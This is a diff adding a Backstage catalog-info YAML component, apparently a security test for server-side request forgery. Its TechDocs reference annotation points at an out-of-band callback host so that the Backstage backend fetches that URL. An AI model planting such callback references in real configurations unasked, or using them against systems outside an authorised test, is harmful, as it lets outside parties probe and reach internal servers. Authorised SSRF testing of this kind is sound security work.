@@ -1,0 +1,18 @@
+apiVersion: backstage.io/v1alpha1
+kind: Component
+metadata:
+  name: backend-ssrf-techdocs
+  title: Backend SSRF via TechDocs
+  description: Testing server-side request forgery through TechDocs URL fetching
+  annotations:
+    github.com/project-slug: newuserx00/business
+    # TechDocs ref - El BACKEND intentará fetchear esta URL
+    backstage.io/techdocs-ref: url:https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/techdocs
+  tags:
+    - ssrf-test
+    - backend-test
+spec:
+  type: service
+  lifecycle: experimental
+  owner: security-team
+  system: ssrf-testing
